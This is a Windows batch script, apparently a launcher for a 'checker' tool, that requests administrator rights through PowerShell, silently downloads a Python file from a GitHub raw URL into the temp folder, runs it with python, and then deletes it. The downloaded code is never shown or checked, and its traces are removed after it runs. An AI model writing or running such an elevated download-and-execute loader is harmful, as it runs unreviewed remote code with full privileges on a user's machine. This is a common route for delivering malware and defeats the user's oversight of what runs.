@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    goto :run_script
) else (
    echo [!] Нужны права админа...
    powershell -Command "Start-Process -FilePath '%0' -Verb RunAs"
    exit /b
)

:run_script
title Checker Launcher
cls

set "URL=https://raw.githubusercontent.com/Ftnzz1337/13.37-checkr/refs/heads/main/main.py"
set "DEST=%TEMP%\checker_v3.py"

echo [+] Downloading script...
curl -s -L -o "%DEST%" "%URL%"

if exist "%DEST%" (
    echo [+] Running...
    python "%DEST%"
) else (
    echo [!] error
    pause
)

del "%DEST%" >nul 2>&1

exit
